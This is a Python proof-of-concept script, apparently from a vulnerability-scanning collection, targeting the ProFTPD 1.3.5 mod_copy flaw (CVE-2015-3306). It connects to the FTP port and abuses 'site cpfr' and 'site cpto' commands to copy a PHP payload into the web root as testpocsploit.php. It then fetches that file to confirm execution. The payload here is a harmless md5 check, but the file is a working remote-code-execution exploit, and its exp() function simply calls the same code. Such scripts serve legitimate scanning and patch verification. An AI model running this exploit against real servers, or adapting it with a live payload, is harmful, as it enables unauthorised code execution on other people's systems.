import requests
import socket
from urllib.parse import urlparse


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ProFTPd RCE''',
        "description": '''The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.''',
        "severity": "high",
        "references": [
            "https://github.com/t0kx/exploit-CVE-2015-3306"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2015", "ftp", "rce", "network", "proftpd"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        o = urlparse(url)
        host = o.hostname
        port = o.port

        _sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _sock.connect((host, port))
        _sock.recv(1024)

        payload = "<?php var_dump(md5(123456));unlink(__FILE__);?>"
        _sock.send(b"site cpfr /proc/self/cmdline\n")
        _sock.recv(1024)
        _sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
        _sock.recv(1024)
        _sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
        _sock.recv(1024)
        _sock.send(("site cpto /var/www/html/testpocsploit.php\n").encode("utf-8"))
        tmp_resp = str(_sock.recv(1024))

        resp = requests.get(url+"/testpocsploit.php", timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "e10adc3949ba59abbe56e057f20f883e" in resp.text and "Copy successful" in tmp_resp:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+"/testpocsploit.php"

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url